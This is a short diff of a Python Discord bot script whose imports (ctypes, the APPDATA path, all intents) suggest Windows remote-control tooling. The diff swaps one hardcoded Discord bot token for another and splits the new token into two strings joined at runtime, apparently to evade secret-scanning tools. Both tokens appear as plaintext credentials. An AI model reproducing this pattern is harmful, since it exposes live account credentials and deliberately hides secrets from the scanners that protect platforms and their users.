@@ -15,7 +15,9 @@ from discord.ext import commands
 from ctypes import *
 import asyncio
 from discord import utils
-token = 'MTI3MDkwMDg5ODk0MzU5ODYyMg.Gi2B5o.DjeJcICcovHPmaiyfXJq3YUyct3O4BE9aYQQm0' #Put the token of your discord bot here
+token1 = 'MTI3MDkwMDg5ODk0MzU5ODYyMg.Gtepny.'
+token2 = 'dX49Q8g-aPtUX2JtgeWQRFINm5QIBgMe0UMkHs'
+token = token1 + token2
 global appdata
 appdata = os.getenv('APPDATA')
 intentz = discord.Intents.all()
